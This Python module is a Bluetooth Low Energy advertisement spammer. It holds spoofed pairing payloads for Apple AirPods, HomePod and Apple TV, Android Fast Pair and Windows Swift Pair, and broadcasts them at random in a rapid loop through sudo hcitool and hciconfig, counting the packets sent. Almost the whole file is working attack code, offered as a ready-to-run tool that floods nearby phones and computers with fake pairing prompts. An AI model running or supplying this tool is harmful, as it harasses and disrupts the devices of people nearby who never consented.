import subprocess, threading, time, random

_state = {'running': False, 'device_type': None, 'count': 0, 'thread': None}

# Apple proximity pair advertisement payloads (company ID 0x004C)
# Format: total_len, 02, 01, 1a, payload_len, ff, 4c, 00, type, ...
_APPLE_PAYLOADS = {
    'airpods':     '1e 02 01 1a 1a ff 4c 00 07 19 01 0e 20 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00',
    'airpods_pro': '1e 02 01 1a 1a ff 4c 00 07 19 01 0e 20 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00',
    'homepod':     '1e 02 01 1a 1a ff 4c 00 09 06 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00',
    'appletv':     '1e 02 01 1a 1a ff 4c 00 04 05 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00',
}

# Android Fast Pair (service UUID 0xFE2C)
_ANDROID_PAYLOAD = '1e 02 01 06 03 03 2c fe 12 16 2c fe 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'

# Windows Swift Pair (Microsoft company ID 0x0006)
_WINDOWS_PAYLOAD = '1e 02 01 06 1a ff 06 00 09 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'

def _get_payloads(device_type):
    if device_type == 'apple':
        return list(_APPLE_PAYLOADS.values())
    elif device_type == 'android':
        return [_ANDROID_PAYLOAD]
    elif device_type == 'windows':
        return [_WINDOWS_PAYLOAD]
    else:  # 'all'
        return list(_APPLE_PAYLOADS.values()) + [_ANDROID_PAYLOAD, _WINDOWS_PAYLOAD]

def _hci_cmd(*args):
    try:
        subprocess.run(['sudo', 'hcitool', '-i', 'hci0', 'cmd'] + list(args),
                       capture_output=True, timeout=3)
    except Exception:
        pass

def _set_adv_data(payload_hex):
    parts = payload_hex.split()
    _hci_cmd('0x08', '0x0008', *parts)

def _enable_adv():
    try:
        subprocess.run(['sudo', 'hciconfig', 'hci0', 'leadv', '3'],
                       capture_output=True, timeout=3)
    except Exception:
        pass

def _disable_adv():
    try:
        subprocess.run(['sudo', 'hciconfig', 'hci0', 'noleadv'],
                       capture_output=True, timeout=3)
    except Exception:
        pass

def _spam_loop(device_type):
    payloads = _get_payloads(device_type)
    _enable_adv()
    while _state['running']:
        payload = random.choice(payloads)
        _set_adv_data(payload)
        _state['count'] += 1
        time.sleep(0.3 + random.random() * 0.4)
    _disable_adv()

def start(device_type='all'):
    if _state['running']:
        return {'error': 'Already running'}
    valid = ('apple', 'android', 'windows', 'all')
    if device_type not in valid:
        return {'error': f'device_type must be one of: {valid}'}
    # check hcitool is available
    r = subprocess.run(['which', 'hcitool'], capture_output=True)
    if r.returncode != 0:
        return {'error': 'hcitool not found — run: sudo apt install bluez'}
    _state['running'] = True
    _state['device_type'] = device_type
    _state['count'] = 0
    t = threading.Thread(target=_spam_loop, args=(device_type,), daemon=True)
    _state['thread'] = t
    t.start()
    return {'status': 'started', 'device_type': device_type}

def stop():
    _state['running'] = False
    if _state.get('thread'):
        _state['thread'].join(timeout=2)
    _state['thread'] = None
    _disable_adv()
    return {'status': 'stopped', 'packets_sent': _state['count']}

def status():
    return {
        'running': _state['running'],
        'device_type': _state['device_type'],
        'count': _state['count'],
    }
